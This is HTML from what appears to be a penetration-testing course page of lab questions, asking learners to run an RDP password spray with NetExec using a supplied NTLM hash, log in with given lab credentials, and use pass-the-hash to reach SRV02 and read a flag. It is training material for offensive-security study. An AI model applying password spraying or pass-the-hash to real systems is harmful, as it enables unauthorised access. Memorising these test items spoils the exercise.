<label class="module-question" for="2463"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Use NetExec to conduct an RDP Password Spray using the hash 'A35289033D176ABAAF6BEAA0AA681400'. Which user successfully authenticated?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2463" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2463">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2463" id="btnAnswer2463">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                Authenticate
                                to <span class="target-protocol-ip target-protocol-ip-2464 text-dark"></span> with user "<span class="text-success">helen</span>" and
                                password "<span class="text-danger">RedRiot88</span>" </p>
<label class="module-question" for="2464"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Login to the target machine using Helen's credentials. Then, use Pass The Hash to authenticate over RDP to SRV02 with the user you found in the previous question. Read the flag located at C:\Flags\hash.txt.
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2464" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2464">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2464" id="btnAnswer2464">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Optional Exercises</h4>
<p class="card-title-desc font-size-large font-size-15">
                                Challenge your understanding of the Module content and answer the optional
                                question(s) below. These are considered supplementary content and are not
                                required to complete the Module. You can reveal the answer at any time to check
                                your work.
                            </p>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
</div>
<div>
<div>
<label class="module-question" for="83">Use Linux xfreerdp to copy a file to SRV01. Use DONE as the answer when finished.</label>
<div class="row">
<div class="col-lg-8 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="exerciseAnswer83" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-primary btn-block btnAnswerExercise" data-exercise-id="83" id="btnAnswerExercise83">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                        </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-outline-warning btn-block" data-target="#revealExerciseAnswer83" data-toggle="modal" id="answerExerciseBtn83"><i class="fad fa-life-ring mr-2"></i> Reveal Answer
                                    </button>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
